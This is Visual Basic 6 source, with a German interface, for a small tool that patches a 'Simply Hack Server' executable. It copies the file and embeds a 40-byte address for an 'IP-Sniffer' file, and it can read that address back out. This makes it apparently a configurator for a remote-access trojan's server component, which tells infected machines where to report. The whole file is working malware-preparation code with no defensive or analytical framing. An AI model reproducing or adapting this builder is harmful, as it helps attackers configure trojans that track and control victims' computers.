VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Form1"
   ClientHeight    =   2160
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   5895
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2160
   ScaleWidth      =   5895
   StartUpPosition =   3  'Windows-Standard
   Begin VB.Frame Frame1 
      Caption         =   "Internetadresse für IP-Sniffer Datei"
      Height          =   1935
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   5655
      Begin VB.CommandButton Command4 
         Caption         =   "Auswählen"
         Height          =   255
         Left            =   4560
         TabIndex        =   10
         Top             =   720
         Width           =   975
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Auswählen"
         Height          =   255
         Left            =   4560
         TabIndex        =   9
         Top             =   360
         Width           =   975
      End
      Begin VB.TextBox txtnew 
         Height          =   285
         Left            =   1560
         TabIndex        =   6
         Top             =   720
         Width           =   2895
      End
      Begin VB.TextBox txtold 
         Height          =   285
         Left            =   1560
         TabIndex        =   4
         Top             =   360
         Width           =   2895
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Aus Serverdatei auslesen"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   1440
         Width           =   2535
      End
      Begin VB.TextBox txturl 
         Height          =   285
         Left            =   1560
         TabIndex        =   2
         Top             =   1080
         Width           =   3975
      End
      Begin VB.CommandButton Command1 
         Caption         =   "In neue Serverdatei schreiben"
         Enabled         =   0   'False
         Height          =   255
         Left            =   3000
         TabIndex        =   1
         Top             =   1440
         Width           =   2535
      End
      Begin MSComDlg.CommonDialog CDC 
         Left            =   3360
         Top             =   360
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
         Filter          =   "Ausführbare Dateien (*.exe)|*.exe"
      End
      Begin VB.Label Label3 
         Caption         =   "Adresse:"
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   1080
         Width           =   1335
      End
      Begin VB.Label Label2 
         Caption         =   "Neue Serverdatei:"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   750
         Width           =   1335
      End
      Begin VB.Label Label1 
         Caption         =   "Alte Serverdatei:"
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   390
         Width           =   1215
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim cpuffer As Byte
Dim urlb As Byte
Dim urlx As String
Dim URL As String * 40

Private Sub Command1_Click()
Open txtold.Text For Binary As #1
Open txtnew.Text For Binary As #2
If LOF(1) = 73728 Then

    For i = 1 To LOF(1)
        Get 1, , cpuffer
        Put 2, , cpuffer
    Next i
    URL = txturl.Text
    Put 2, , URL

ElseIf LOF(1) = 73768 Then
    For i = 1 To LOF(1)
        Get 1, , cpuffer
        Put 2, , cpuffer
    Next i
    URL = txturl.Text
    Put 2, LOF(1) - 40, URL

Else
    MsgBox "Fehler: Dies scheint kein Simply Hack Server der Version X.X.X zu sein", vbSystemModal, "Fehler!"
End If

Close #1
Close #2

End Sub

Private Sub Command2_Click()
    txturl.Text = ""
    urlx = ""
    Open txtold.Text For Binary As #1
    
    For i = 1 To 40
        Get 1, LOF(1) - (40 - i), urlb
        If urlb <> 32 Then
            If urlb <> 0 Then
                urlx = urlx & Chr(urlb)
            End If
        End If
    Next i
    
    If urlx = "" Then MsgBox "Server enthält noch keine Adressinformationen!", vbSystemModal, "Fehler"
    txturl.Text = urlx

Close #1
End Sub

Private Sub Command3_Click()
    CDC.ShowOpen
    txtold.Text = CDC.FileName
End Sub

Private Sub Command4_Click()
    CDC.ShowSave
    txtnew.Text = CDC.FileName
End Sub

Private Sub txtnew_Change()
    If txtnew.Text <> "" Then
        If txtold.Text <> "" Then
            Command2.Enabled = True
        End If
    Else
        Command2.Enabled = False
    End If
End Sub

Private Sub txtold_Change()
    If txtold.Text <> "" Then
        If txtnew.Text <> "" Then
            Command2.Enabled = True
        End If
    Else
        Command2.Enabled = False
    End If
End Sub

Private Sub txturl_Change()
    If txturl.Text <> "" Then
        Command1.Enabled = True
    Else
        Command1.Enabled = False
    End If
End Sub
